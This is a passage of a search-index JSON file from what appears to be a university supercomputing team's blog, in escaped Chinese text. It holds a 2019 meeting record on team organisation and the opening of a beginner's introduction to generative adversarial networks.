\u7ed9\u6211\u4eec\u7684\u5efa\u8bae\u662f\uff0c\u4ee5\u8001\u5e26\u65b0\uff0c\u957f\u671f\u57f9\u517b\u6280\u672f\u6808\u3002\u6211\u4eec\u9700\u8981\u5199\u6587\u6863\u5199\u535a\u5ba2\uff0c\u9700\u8981\u8bb0\u5f55\u5e76\u5206\u4eab\u81ea\u5df1\u7684\u7ecf\u9a8c\u7ed9\u56e2\u961f\uff0c\u6211\u4eec\u9700\u8981\u4e0d\u65ad\u5b66\u4e60\u5e76\u4f20\u627f\u81ea\u5df1\u7684\u77e5\u8bc6\uff0c\u8fd9\u6837\u56e2\u961f\u624d\u80fd\u591f\u6210\u957f\u3001\u4e0d\u81f3\u4e8e\u5728\u5931\u53bb\u67d0\u4e2a\u6838\u5fc3\u4eba\u7269\u540e\u5c31\u4e00\u65e0\u6240\u6709\u3002</p>"},{"location":"blog/2019/05/27/20190526-%E4%BC%9A%E8%AE%AE%E8%AE%B0%E5%BD%95/#\u5173\u4e8e\u8d85\u7b97\u961f\u7684\u6574\u987f","title":"\u5173\u4e8e\u8d85\u7b97\u961f\u7684\u6574\u987f","text":"<p>\u9646\u9646\u7eed\u7eed\u5728\u6574\u987f\u8d85\u7b97\u961f\uff0c\u8fd9\u91cc\u505a\u4e00\u4e2a\u603b\u7ed3\uff1a</p>"},{"location":"blog/2019/05/27/20190526-%E4%BC%9A%E8%AE%AE%E8%AE%B0%E5%BD%95/#\u56e2\u961f\u76ee\u6807\u5b9a\u4f4d","title":"\u56e2\u961f\u76ee\u6807&amp;\u5b9a\u4f4d","text":"<p>\u6d59\u5927\u8d85\u7b97\u961f\u662f\u4e00\u652f\u9ad8\u6027\u80fd\u8ba1\u7b97\u6bd4\u8d5b\u56e2\u961f\uff0c\u540c\u65f6\u4e5f\u662f\u9ad8\u6027\u80fd\u8ba1\u7b97\u7684\u5174\u8da3\u4e0e\u79d1\u7814\u5e73\u53f0\u3002</p> <p>\u6bd4\u8d5b\u4e0d\u662f\u6211\u4eec\u7684\u5168\u90e8\uff0c\u4f46\u662f\u662f\u6211\u4eec\u76ee\u7684\uff1b\u4f46\u4e0d\u53c2\u52a0\u6bd4\u8d5b\uff0c\u5728\u8fd9\u91cc\u8ba4\u771f\u7684\u73a9\u800d\uff0c\u6211\u4eec\u4e5f\u662f\u6b22\u8fce\u7684\u2014\u2014\u4f46\u662f\u524d\u63d0\u8981\u201d\u8ba4\u771f\u201c(\u8981\u6709\u6210\u679c\u6709\u8d21\u732e (\u535a\u5ba2))\u3002</p> <p>\u9648\u8001\u5e08\u7ed9\u7684\u56e2\u961f\u76ee\u6807\uff1a\u6bcf\u5e74\u7684 ASC \u81f3\u5c11\u62ff\u5230\u4e00\u7b49\u5956 + \u53e6\u5916\u4e00\u4e2a\u5956</p>"},{"location":"blog/2019/05/27/20190526-%E4%BC%9A%E8%AE%AE%E8%AE%B0%E5%BD%95/#\u56e2\u961f\u7ed3\u6784","title":"\u56e2\u961f\u7ed3\u6784","text":"<p>\u56e2\u961f\u5206\u5c42\u5f88\u7b80\u5355\uff0c\u73b0\u4efb\u961f\u5458\u5c42\u548c\u8001\u961f\u5458\u5c42\u3002\u5982\u679c\u968f\u7740\u5e74\u7ea7\u589e\u957f\u8bfe\u4e1a\u7e41\u91cd\uff0c\u9762\u4e34\u6bd5\u4e1a\u3001\u51fa\u56fd\u3001\u5b9e\u4e60\u7b49\uff0c\u73b0\u4efb\u961f\u5458\u6210\u4e3a\u8001\u961f\u5458\u3002</p> <p>\u73b0\u4efb\u961f\u5458\u7ef4\u6301\u5728 10~20 \u4eba\uff0c\u5176\u4e2d 3 \u4eba\u5de6\u53f3\u8d1f\u8d23\u6574\u4e2a\u56e2\u961f\u3002\u73b0\u4efb\u961f\u5458\u6bcf\u4e2a\u4eba\u81ea\u5df1\u9009\u62e9\u81ea\u5df1\u7684\u5206\u5de5\u3002</p>"},{"location":"blog/2019/05/27/20190526-%E4%BC%9A%E8%AE%AE%E8%AE%B0%E5%BD%95/#\u6bcf\u4e00\u4e2a\u4eba\u90fd\u9700\u8981\u4e00\u4e2a\u76ee\u6807","title":"\u6bcf\u4e00\u4e2a\u4eba\u90fd\u9700\u8981\u4e00\u4e2a\u76ee\u6807","text":"<p>\u5176\u5b9e\u5e76\u4e0d\u60f3\u5f3a\u8c03\u8fd9\u4e00\u70b9\u7684\uff0c\u6bd5\u7adf</p> <p>\u8fd9\u4e2a\u56e2\u961f\u672c\u6765\u5c31\u662f\u9760\u5174\u8da3\u805a\u5728\u4e00\u8d77\uff0c\u6bcf\u4e2a\u4eba\u90fd\u4eab\u53d7\u4e00\u8d77\u627e\u95ee\u9898\u5b66\u4e1c\u897f\u3001\u505a\u51fa\u6210\u679c\u7684\u611f\u89c9</p> <p>\uff0c\u5982\u679c\u975e\u8981\u5f3a\u8c03\u76ee\u6807\u3001\u4efb\u52a1\uff0c\u5c31\u6ca1\u4ec0\u4e48\u610f\u601d\u4e86\u3002\u4f46\u662f\u60f3\u8bf4\u7684\u662f\uff0c\u8fd9\u4e2a\u961f\u4f0d\u4e5f\u9700\u8981\u4e00\u4e2a\u5e95\u7ebf\uff0c\u6bcf\u4e2a\u4eba\u4e5f\u5e94\u5f53\u6709\u4e00\u4e2a\u81ea\u5df1\u7684\u5e95\u7ebf\uff0c\u77e5\u9053\u81ea\u5df1\u5728\u8fd9\u4e2a\u56e2\u961f\u91cc\u8981\u505a\u4ec0\u4e48\u3002\u5f53\u7136\uff0c\u8fd8\u662f\u66f4\u52a0\u5e0c\u671b\u5404\u4f4d\u80fd\u4ee5\u5174\u8da3\u53bb\u4e3b\u52a8\u6d3b\u8dc3\u5728\u8fd9\u4e2a\u56e2\u961f\u4e2d\u3002</p>"},{"location":"blog/2019/05/27/20190526-%E4%BC%9A%E8%AE%AE%E8%AE%B0%E5%BD%95/#\u5982\u679c\u4f60\u60f3\u641e\u6bd4\u8d5b","title":"\u5982\u679c\u4f60\u60f3\u641e\u6bd4\u8d5b","text":"<p>\u505a\u6bd4\u8d5b\u76f8\u5173\u7684\u4e8b\u60c5\uff1a</p> <ul> <li>\u8fd0\u7ef4\u3001\u8f6f\u786c\u4ef6\u3001\u7f51\u7edc \u2192 \u4f18\u5316\u96c6\u7fa4\u3001\u5de5\u5177\u96c6\u3001\u6bd4\u8d5b\u7b56\u7565</li> <li>\u505a\u5386\u5e74\u8d5b\u9898\uff1a\u79d1\u5b66\u8ba1\u7b97 - \u5e94\u7528\u4f18\u5316-ML/DL</li> </ul> <p>\u5982\u679c\u9047\u5230\u4e0d\u4f1a\u7684\u5c31\u5b66\u4e60\u3001\u5199\u6587\u6863\uff1b\u975e\u5e38\u9f13\u52b1\u5927\u5bb6\u6839\u636e\u8d5b\u9898\u6d89\u53ca\u9886\u57df\u8054\u7cfb\u5bf9\u5e94\u7684\u5b66\u6821\u6559\u6388\uff08\u53ef\u4ee5\u62dc\u6258\u9648\u8001\u5e08\uff09</p>"},{"location":"blog/2019/05/27/20190526-%E4%BC%9A%E8%AE%AE%E8%AE%B0%E5%BD%95/#\u5982\u679c\u4f60\u4e0d\u60f3\u641e\u6bd4\u8d5b","title":"\u5982\u679c\u4f60\u4e0d\u60f3\u641e\u6bd4\u8d5b","text":"<ul> <li>\u505a\u96c6\u7fa4\u8fd0\u7ef4 + \u5199\u6587\u6863 \u2014\u2014 \u8003\u8651\u628a\u6211\u6821\u522b\u7684\u96c6\u7fa4\u8fd0\u7ef4\u8d77\u6765\uff0c\u5f88\u591a\u6821\u5185\u96c6\u7fa4\u90fd\u5728\u95f2\u7f6e\u3001\u6d59\u5927\u955c\u50cf\u6e90\u4e5f\u53ef\u4ee5\u63a5\u53d7\u6765\u7ba1\u7406 \u2014\u2014 \u4e0d\u8981\u7ed9\u81ea\u5df1\u592a\u5927\u538b\u529b\uff0c\u5e76\u4e0d\u662f\u8bf4\u6211\u4eec\u8981\u505a\u7684\u6709\u591a\u597d\uff0c\u6211\u4eec\u8981\u505a\u7684\u4ec5\u4ec5\u662f\u953b\u70bc\u3001\u5b9e\u8df5\uff0c\u7136\u540e\u4e00\u8d77\u5b66\u4e60\u3002</li> <li>\u5229\u7528\u96c6\u7fa4\u8d44\u6e90\u6765\u5e72\u70b9\u79c1\u6d3b\u662f\u53ef\u4ee5\u7684\uff0c\u5173\u952e\u662f\u8981\u6c42\u5199\u6587\u6863\uff0c\u628a\u4f60\u7684\u7ecf\u9a8c\u5206\u4eab\u51fa\u6765 \u2014\u2014 \u5e2e\u5fd9\u8dd1\u5176\u4ed6\u8001\u5e08\u7684\u79d1\u7814\u5b9e\u9a8c\u3001\u8bba\u6587\u53ef\u4ee5\u7f72\u540d</li> <li>\u6d3b\u52a8\u7ec4\u7ec7\u3001\u56e2\u961f\u7ba1\u7406</li> </ul>"},{"location":"blog/2019/05/27/20190526-%E4%BC%9A%E8%AE%AE%E8%AE%B0%E5%BD%95/#\u56e2\u961f\u8fdb\u51fa\u673a\u5236","title":"\u56e2\u961f\u8fdb\u51fa\u673a\u5236","text":"<p>\u540c\u6837\uff0c\u4e0d\u60f3\u63d0\u8fd9\u4e00\u70b9\uff0c\u56e0\u4e3a\u5982\u679c\u5174\u8da3\u80fd\u591f\u7ed9\u4e88\u5927\u5bb6\u8db3\u591f\u7684\u52a8\u529b\uff0c\u5c31\u4e0d\u9700\u8981\u8003\u6838\u3002</p> <p>\u6240\u4ee5\u8fd9\u91cc\u5c31\u7b80\u5355\u6765\u8ba8\u8bba\u4e00\u4e0b\u8fd9\u4e2a\u95ee\u9898\uff1a</p> <ul> <li>\u65b0\u961f\u5458\u5165\u961f\uff0c\u770b\u9762\u8bd5\u548c\u6c34\u5e73\uff0c\u770b\u505a\u9898\u505a\u5f97\u5982\u4f55\uff1b\u8001\u961f\u5458\u7559\u4e0b\u6765\uff0c\u9700\u8981\u770b\u8d21\u732e\u5ea6\u3002</li> <li>\u8d21\u732e\u5ea6\u770b\u4e24\u4e2a\u6307\u6807\uff1a\u53d1\u535a\u6570\u91cf + \u4efb\u52a1\u6d3b\u52a8\u53c2\u4e0e\u5ea6\uff1b\u4ee5\u5b66\u5e74\u4e3a\u8003\u6838\u5c3a\u5ea6\u3001\u4e0d\u91cf\u5316\u2014\u2014\u5404\u4f4d\u7684\u8d21\u732e\uff0c\u6211\u4eec\u90fd\u6709\u76ee\u5171\u7779\u3002</li> </ul>"},{"location":"blog/2019/05/27/20190526-%E4%BC%9A%E8%AE%AE%E8%AE%B0%E5%BD%95/#\u8d85\u7b97\u961f\u7684\u4efb\u52a1\u7ba1\u7406\u8ddf\u8e2a","title":"\u8d85\u7b97\u961f\u7684\u4efb\u52a1\u7ba1\u7406\u8ddf\u8e2a","text":"<p>\u8d85\u7b97\u961f\u7684\u8ba1\u5212\u3001\u6b63\u5728\u505a\u7684\u4e8b\u60c5\u548c\u4e00\u4e9b\u5176\u4ed6\u7684\u4fe1\u606f\u3002</p> <p>\u76ee\u524d\u4f7f\u7528 Trello \u6765\u505a\u56e2\u961f\u4efb\u52a1\u770b\u677f\uff0c\u5982\u679c\u6709\u4efb\u4f55\u597d\u7684\u5efa\u8bae\u6b22\u8fce\u63d0\u51fa\u6765\u3002</p> <p>\u5e0c\u671b\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u80fd\u591f\u4ee5\u5174\u8da3\u9a71\u52a8\uff0c\u805a\u5728\u4e00\u8d77\u7814\u7a76\u611f\u5174\u8da3\u7684\u4e1c\u897f\u6765\uff0c\u800c\u4e0d\u662f\u4e0d\u60c5\u613f\u5730\u9886\u9505\u505a\u4efb\u52a1\u751a\u81f3\u5495\u5495\u5495\uff0c\u8fd9\u6837\u4e0b\u53bb\u56e2\u961f\u5c06\u6ca1\u6709\u751f\u547d\u529b\u3002\u76f8\u4fe1\u8c01\u90fd\u4e0d\u60f3\u770b\u5230\u8fd9\u6837\u7684\u7ed3\u5c40\u3002\u8d85\u7b97\u961f\u73b0\u5728\u7684\u5236\u5ea6\u53ef\u80fd\u6709\u4e0d\u59a5\u5f53\u7684\u5730\u65b9\uff0c\u6b22\u8fce\u5927\u5bb6\u63d0\u51fa\u6765\uff0c\u4e5f\u5e0c\u671b\u771f\u6b63\u611f\u5174\u8da3\u7684\u540c\u5b66\u8054\u7cfb\u6211\uff0c\u6211\u4eec\u4e00\u8d77\u5b66\u4e60\u7814\u7a76\uff0c\u628a\u8fd9\u4e2a\u56e2\u961f\u641e\u6d3b\u3002</p>"},{"location":"blog/2019/05/31/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/","title":"\u751f\u6210\u5f0f\u5bf9\u6297\u7f51\u7edc\u2014\u2014\u57fa\u7840","text":"<p>Reference: Machine Learning and having it deep and structured (2018,Spring) \uff08\u674e\u5b8f\u6bc5\uff09</p> <p>\u751f\u6210\u5f0f\u5bf9\u6297\u7f51\u7edc\uff08Generative Adversarial Network\uff0cGAN\uff09\uff0c\u662f 2014 \u5e74\u88ab\u63d0\u51fa\u6765\u7684\u4e00\u79cd\u751f\u6210\u5f0f\u6df1\u5ea6\u5b66\u4e60\u7f51\u7edc\u6280\u672f\u3002</p> <p>\u7531\u4e8e\u5728\u4f17\u591a\u5e94\u7528\u573a\u5408\u4e2d\u7684\u51fa\u8272\u8868\u73b0\uff0c\u8fd1\u5e74\u6765 GAN \u7684\u5e94\u7528\u548c\u7814\u7a76\u5df2\u7ecf\u6210\u4e3a\u4e00\u4e2a\u975e\u5e38\u70ed\u95e8\u7684\u65b9\u5411\u3002</p> <p></p> <p>\u8fd9\u7bc7\u6587\u7ae0\u5c06\u4f1a\u5bf9 GAN \u505a\u4e00\u4e2a\u76f4\u89c2\u7684\u4ecb\u7ecd\uff0c\u5e2e\u52a9\u8bfb\u8005\u7406\u89e3 GAN \u7684 Basic Idea\u3002</p> <p>\u7b2c\u4e00\u8282\u4e2d\uff0c\u6211\u4eec\u5c06\u7b80\u5355\u5bf9\u673a\u5668\u5b66\u4e60\u7684 Basic Ideas \u505a\u4e00\u4e2a\u56de\u987e\u3002\u7b2c\u4e8c\u8282\u548c\u7b2c\u4e09\u8282\u4f1a\u7b80\u5355\u4ecb\u7ecd\u4e00\u4e0b\u4ec0\u4e48\u662f\u751f\u6210\uff08Generation\uff09\u3002\u7b2c\u56db\u8282\u548c\u7b2c\u4e94\u8282\u4f1a\u4ecb\u7ecd\u4e24\u79cd\u751f\u6210\u6a21\u578b\u3002\u7b2c\u516d\u8282\u6211\u4eec\u5c06\u4f1a\u770b\u5230 GAN \u662f\u5982\u4f55\u7ed3\u5408\u8fd9\u4e24\u79cd\u6a21\u578b\u4ece\u800c\u8fbe\u5230\u4f18\u79c0\u7684\u8868\u73b0\u3002</p>"},{"location":"blog/2019/05/31/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/#review-for-ml","title":"Review for ML","text":"<p>\u5728\u4e4b\u524d\u7684\u6587\u7ae0\uff08 \u673a\u5668\u5b66\u4e60 / \u5377\u79ef\u795e\u7ecf\u7f51\u7edc\uff09\u4e2d\uff0c\u6211\u4eec\u4ecb\u7ecd\u4e86\u4e00\u4e9b\u673a\u5668\u5b66\u4e60\uff08Machine Learning\uff09\u7684\u601d\u60f3\u548c\u4f8b\u5b50\u3002</p> <p>\u7b80\u5355\u56de\u987e\u4e00\u4e0b\u5728\u8fd9\u4e9b\u6587\u7ae0\u4e2d\u7684\u8ba8\u8bba\uff0c\u6211\u4eec\u77e5\u9053\uff0c\u673a\u5668\u5b66\u4e60\u672c\u8d28\u4e0a\u5c31\u662f\u4e00\u4e2a\u6620\u5c04\u62df\u5408\u00a0:</p> <p>\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0c\u6a21\u578b\uff08Model\uff09\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u6211\u4eec\u5e0c\u671b\u5bf9\u5b83\u8f93\u5165\u4e00\u4e2a\u81ea\u53d8\u91cf x\uff0c\u80fd\u4ece\u5b83\u90a3\u91cc\u5f97\u5230\u4e00\u4e2a\u6211\u4eec\u60f3\u8981\u7684\u8f93\u51fa y\u3002\u4ee5\u623f\u4ef7\u9884\u6d4b\u4e3a\u4f8b\uff0c\u6211\u4eec\u5e0c\u671b\u544a\u8bc9\u8fd9\u4e2a\u6a21\u578b\u4e00\u4e9b\u5f53\u524d\u7684\u7ecf\u6d4e\uff0c\u653f\u6cbb\u7b49\u793e\u4f1a\u73af\u5883\uff0c\u5b83\u80fd\u53cd\u9988\u4e00\u4e2a\u623f\u4ef7\u6570\u503c\u3002\u4ee5\u56fe\u50cf\u5206\u7c7b\u4e3a\u4f8b\uff0c\u6211\u4eec\u5e0c\u671b\u544a\u8bc9\u8fd9\u4e2a\u6a21\u578b\u4e00\u5f20\u56fe\u7247\uff0c\u5b83\u80fd\u53cd\u9988\u7ed9\u6211\u4eec\u8fd9\u5f20\u56fe\u7247\u5c5e\u4e8e\u4ec0\u4e48\u7c7b\u522b\u3002</p> <p>\u5728\u6700\u7b80\u5355\u7684\u5f62\u5f0f\u4e2d\uff0c\u6211\u4eec\u7528\u4e00\u4e2a\u7b80\u5355\u7684\u7ebf\u6027\u6a21\u578b\uff08Linear Model\uff09 \\(w*x=y\\) \u6765\u5efa\u6a21\u8fd9\u4e2a\u51fd\u6570\u3002\u9ad8\u7ea7\u4e00\u70b9\uff0c\u9009\u62e9\u4e00\u4e2a\u66f4\u590d\u6742\u7684\u6838\u51fd\u6570\uff08\u53e6\u4e00\u79cd\u8bf4\u6cd5\u4e5f\u53ef\u4ee5\u79f0\u7279\u5f81\u51fd\u6570\uff09\u7684\u8bdd\uff0c\u8fd9\u4e2a\u7ebf\u6027\u6a21\u578b\u53ef\u4ee5\u8868\u8fbe\u66f4\u52a0\u590d\u6742\u7684\u5173\u7cfb\u3002\u518d\u9ad8\u7ea7\u4e00\u70b9\uff0c\u628a\u8fd9\u4e9b\u7ebf\u6027\u6a21\u578b\u591a\u5c42\u590d\u5408\u8d77\u6765\uff0c\u5f62\u6210\u795e\u7ecf\u7f51\u7edc\uff08Neural Network\uff09\uff0c\u8868\u8fbe\u529b\u5c31\u66f4\u5f3a\uff0c\u800c\u8fd9\u4e2a\u7528\u6df1\u5ea6\u795e\u7ecf\u7f51\u7edc\u6765\u5efa\u6a21\u7684\u65b9\u6cd5\u81ea\u6210\u4e00\u6d3e\uff0c\u4e5f\u5c31\u662f\u6240\u8c13\u7684\u6df1\u5ea6\u5b66\u4e60\uff08Deep Learning\uff09\u3002</p> <p>\u800c\u5e38\u5e38\u6240\u8bf4\u7684\u8bad\u7ec3\u6570\u636e\uff08Training Data\uff09\u65e0\u975e\u5c31\u662f\u4ece\u771f\u5b9e\u7684\u4e16\u754c\u4e2d\u91c7\u6837\u7684\u4e00\u7ec4\uff08x\uff0cy\uff09\u6837\u672c\u3002\u8bad\u7ec3\uff08Training\uff09\u5219\u662f\u8ba9\u6211\u4eec\u7684\u6a21\u578b\u4ece\u8bad\u7ec3\u6570\u636e\u4e2d\u5b66\u4e60 x \u548c y \u4e4b\u95f4\u5b58\u5728\u7684\u67d0\u79cd\u89c4\u5f8b\u7684\u6a21\u5f0f\uff08Pattern\uff09\uff0c\u6a21\u578b\u7684\u53c2\u6570\u5728\u5b66\u4e60\u8fc7\u7a0b\u4e2d\u4e0d\u65ad\u8c03\u6574\uff0c\u6700\u540e\u6a21\u578b\u4ee3\u8868\u7684\u51fd\u6570\u5c3d\u53ef\u80fd\u7684\u53bb\u6a21\u62df\u4e86\u771f\u5b9e\u4e16\u754c\u4e2d\u7684\u6620\u5c04\u5173\u7cfb\u3002</p> <p>\u8fd9\u4e2a\u5b66\u4e60\u8fc7\u7a0b\u53c8\u662f\u600e\u6837\u7684\u5462\uff1f\u901a\u5e38\u5c31\u662f\u5b9a\u4e49\u4e86\u4e00\u4e2a\u635f\u5931\u51fd\u6570\uff08Loss Function\uff09\uff0c\u8fd9\u4e2a\u635f\u5931\u51fd\u6570\u7684\u503c\u662f\u57fa\u4e8e\u6a21\u578b\u9884\u6d4b\u51fa\u6765\u7684\u7ed3\u679c\u548c\u6211\u4eec\u91c7\u6837\u51fa\u6765\u7684\u771f\u5b9e\u7ed3\u679c\u7684\u5dee\u522b\u3002\u6240\u8c13\u5b66\u4e60\u5176\u5b9e\u5c31\u662f\u6700\u5c0f\u5316\u8fd9\u4e2a\u5dee\u522b\u3002\u56e0\u6b64\uff0c\u6240\u8c13\u7684\u5b66\u4e60\uff0c\u672c\u8d28\u4e0a\u5c31\u662f\u8fd9\u4e2a\u51fd\u6570\u6700\u4f18\u5316\u95ee\u9898\u7684\u4e00\u79cd\u62df\u4eba\u5316\u8868\u8fbe\u800c\u5df2\u3002</p> <p>\u56e0\u6b64\u673a\u5668\u5b66\u4e60\u5b9e\u9645\u4e0a\u5c31\u662f\u7ed9\u5b9a\u4e00\u4e2a\u8bad\u7ec3\u6570\u636e\u96c6\uff0c\u4ea7\u751f\u4e00\u4e2a\u9884\u6d4b\u51fd\u6570\u3002\u8fd9\u4e2a\u9884\u6d4b\u51fd\u6570\u80fd\u5bf9\u8f93\u5165\u7684 x \u7ed9\u51fa\u671f\u671b\u7684 y\uff0c\u7b80\u5355\u7684\u53ef\u4ee5\u8868\u793a\u4e3a\u8fd9\u6837\uff1a</p> <p></p>"},{"location":"blog/2019/05/31/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/#what-is-generation","title":"What Is Generation","text":"<p>\u673a\u5668\u5b66\u4e60\u4e2d\uff0c\u6709\u5f88\u591a\u79cd\u7c7b\u578b\u7684\u4efb\u52a1\uff0c\u6bd4\u5982\u6700\u7b80\u5355\u7684\u56de\u5f52\uff08Regression\uff09\uff0c\u5206\u7c7b\uff08Classification\uff09\u7b49\u3002</p> <p>\u5b83\u4eec\u662f\u673a\u5668\u5b66\u4e60\u5165\u95e8\u65f6\u80af\u5b9a\u4f1a\u63a5\u89e6\u7684\u4f8b\u5b50\uff0c\u5e38\u89c1\u7684\u56de\u5f52/\u5206\u7c7b\u4efb\u52a1\u6bd4\u5982\uff1a\u7ed9\u5b9a\u4e00\u5f20\u56fe\u7247\uff0c\u8f93\u51fa\u4e00\u4e2a\u6807\u91cf\u6216\u8005\u5411\u91cf\u63cf\u8ff0\u8fd9\u4e2a\u56fe\u7247\u7684\u6027\u8d28\u3002</p> <p>\u800c\u751f\u6210\uff08Generation\uff09\u5b9e\u9645\u4e0a\u5c31\u53ef\u4ee5\u7b80\u5355\u7684\u7406\u89e3\u4e3a\u4e0a\u8ff0\u4efb\u52a1\u7684\u4e00\u79cd\u9006\u5411\u8fc7\u7a0b\u3002\u7ed9\u673a\u5668\u4e00\u5f20\u56fe\u7247\uff0c\u5b83\u7ed9\u4f60\u4e00\u4e2a\u5411\u91cf\u63cf\u8ff0\u5b83\u7684\u7c7b\u522b\u6216\u8005\u7279\u5f81\uff0c\u4f3c\u4e4e\u5f88\u65e0\u804a\uff1f\u90a3\u4e48\u5982\u679c\u7ed9\u673a\u5668\u4e00\u4e2a\u5411\u91cf\u540e\uff0c\u5b83\u7ed9\u4f60\u751f\u6210\u4e00\u5f20\u56fe\u7247 (~~\u8001\u5a46~~) \u5462\uff1f</p> <p></p> <p></p> <p>\u8fd9\u5c31\u662f\u751f\u6210\u4efb\u52a1\u6700\u76f4\u89c2\u6700\u7b80\u5355\u7684\u4f8b\u5b50\u3002\uff08\u9664\u4e86\u751f\u6210\u56fe\u7247\u4ee5\u5916\uff0c\u5f53\u7136\u5b83\u4e5f\u53ef\u4ee5\u7528\u6765\u751f\u6210\u53e5\u5b50/\u97f3\u9891\u7b49\u5176\u5b83\u4efb\u4f55\u4f60\u80fd\u60f3\u5230\u7684\u4e1c\u897f\uff0c\u53ea\u8981\u80fd\u4fdd\u8bc1\u53ef\u8bad\u7ec3\u3002\uff09</p> <p>\u5982\u4e0a\u56fe\u6240\u793a\uff0c\u53ea\u9700\u8981\u8c03\u6574\u5bf9\u751f\u6210\u5668\u7684\u8f93\u5165\u5411\u91cf\uff0c\u5b83\u5c31\u4f1a\u76f8\u5e94\u7684\u751f\u6210\u4e0d\u540c\u7684\u56fe\u7247\u3002P2 \u4e2d\u589e\u5927\u4e86\u7b2c\u4e00\u7ef4\u7684\u8f93\u5165\uff0c\u751f\u6210\u7684\u4eba\u7269\u5934\u53d1\u53d8\u957f\u4e86\uff1bP3 \u4e2d\u6539\u53d8\u5411\u91cf\u5012\u6570\u7b2c\u4e8c\u7ef4\u7684\u8f93\u5165\uff0c\u4eba\u7269\u5934\u53d1\u53d8\u6210\u4e86\u84dd\u8272\uff1bP4 \u4e2d\u589e\u5927\u4e86\u5411\u91cf\u7684\u6700\u540e\u4e00\u7ef4\uff0c\u751f\u6210\u7684\u4eba\u50cf\u5c31\u53d8\u5f97\u7b11\u53e3\u5e38\u5f00\u4e86\u3002</p>"},{"location":"blog/2019/05/31/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/#why-generation","title":"Why Generation","text":"<p>\u4e00\u4e2a\u5f88\u81ea\u7136\u7684\u95ee\u9898\u662f\uff1a\u4e3a\u4ec0\u4e48\u6211\u4eec\u9700\u8981\u751f\u6210\uff1f\u7ed9\u6211\u4e00\u4e2a\u5411\u91cf\uff0c\u6211\u751f\u6210\u4e00\u5f20\u56fe\u7247\u6709\u4ec0\u4e48\u7528\uff1f</p> <p>\u5982\u679c\u53ea\u662f\u7ed9\u4e00\u4e2a\u5f88\u67af\u71e5\u7684\u5411\u91cf\uff0c\u8ba9\u673a\u5668\u751f\u6210\u4e00\u5f20\u56fe\u7247\u786e\u5b9e\u6ca1\u5565\u7528\u3002\u4f46\u662f\u5982\u679c\u518d\u7ec4\u5408\u4e0a\u5176\u5b83\u7684\u529f\u80fd\u6a21\u5757\uff0c\u8fd9\u4e2a\u6280\u672f\u53ef\u80fd\u4f1a\u975e\u5e38\u6709\u7528\u3002</p> <p></p> <p>\u6bd4\u5982\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u4e0d\u4ece\u5411\u91cf\u5f00\u59cb\uff0c\u800c\u4ece\u4e00\u4e2a\u53e5\u5b50\u5f00\u59cb\u3002\u8bad\u7ec3\u8fd9\u6837\u4e00\u4e2a\u6a21\u578b\uff0c\u81ea\u7136\u8bed\u8a00\u5148\u88ab\u8f6c\u6210\u5411\u91cf\u7f16\u7801\uff0c\u5411\u91cf\u7f16\u7801\u518d\u88ab\u8f6c\u6210\u8fd9\u4e2a\u81ea\u7136\u8bed\u8a00\u53e5\u5b50\u63cf\u8ff0\u7684\u753b\u9762\u3002</p> <p></p> <p>\u53c8\u6bd4\u5982\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u4ece\u56fe\u7247\u4e2d\u4fee\u6539\u4e00\u90e8\u5206\u533a\u57df\uff0c\u753b\u51fa\u4e00\u4e2a\u7b80\u5355\u7684\u8349\u56fe\uff0c\u5b83\u5c31\u81ea\u52a8\u5e2e\u6211\u4eec\u751f\u6210\u66f4\u52a0\u771f\u5b9e\u7684\u4fee\u6539\u5185\u5bb9\u3002</p> <p></p> <p>\u4f60\u751a\u81f3\u8fd8\u53ef\u4ee5\u6839\u636e\u9a6c\u4e91\u7684\u8138\u7684\u8868\u60c5\u4fe1\u606f\u7684\u7f16\u7801\u751f\u6210\u4e00\u5f20\u5c0f\u7f57\u4f2f\u7279\u00b7\u5510\u5c3c\u540c\u6837\u8868\u60c5\u7684\u8138\uff0c\u7136\u540e\u66ff\u6362\u4e0a\u53bb\uff0c\u4ea7\u751f\u771f\u5b9e\u7684\u6362\u8138\u6548\u679c\u3002</p> <p>\u751f\u6210\uff0c\u5728\u67d0\u79cd\u610f\u4e49\u4e0a\u6765\u8bf4\uff0c\u662f\u4eba\u5de5\u667a\u80fd\u6700\u6709\u610f\u4e49\u7684\u4efb\u52a1\u3002\u56de\u5f52\u548c\u5206\u7c7b\u8fd9\u6837\u7684\u4efb\u52a1\u4ec5\u4ec5\u662f\u53bb\u7406\u89e3\u548c\u8bc6\u522b\u6211\u4eec\u719f\u77e5\u7684\u5bf9\u8c61\uff0c\u6bd4\u5982\u8bc6\u522b\u4e00\u53e5\u8bdd\u662f\u4e0d\u662f\u810f\u8bdd\uff0c\u8bc6\u522b\u4e00\u5f20\u56fe\u7247\u662f\u4e0d\u662f\u732b\u3002\u4f46\u662f\u751f\u6210\u5374\u662f\u5316\u8150\u673d\u4e3a\u795e\u5947\uff0c\u4ec5\u4ec5\u6839\u636e\u4e00\u4e9b\u975e\u5e38\u7a7a\u6d1e\u7684\u63cf\u8ff0\u5c31\u81ea\u52a8\u751f\u6210\u4e86\u6211\u4eec\u4eba\u6240\u719f\u77e5\u7684\u5bf9\u8c61\uff0c\u8fd9\u624d\u662f\u6211\u4eec\u771f\u6b63\u6700\u60f3\u8ba9\u4eba\u5de5\u667a\u80fd\u4e3a\u6211\u4eec\u505a\u7684\u3002\u4ec5\u4ec5\u662f\u7406\u89e3\u548c\u8bc6\u522b\uff0c\u4eba\u5de5\u667a\u80fd\u7ec8\u7a76\u53ea\u662f\u4f5c\u4e3a\u4e00\u79cd\u8f85\u52a9\u5de5\u5177\u3002\u4f46\u662f\u5f53\u5b83\u80fd\u521b\u9020\u7684\u65f6\u5019\uff0c\u5b83\u5c31\u7ffb\u8eab\u505a\u4e86\u4e3b\u4eba\u3002</p> <p></p> 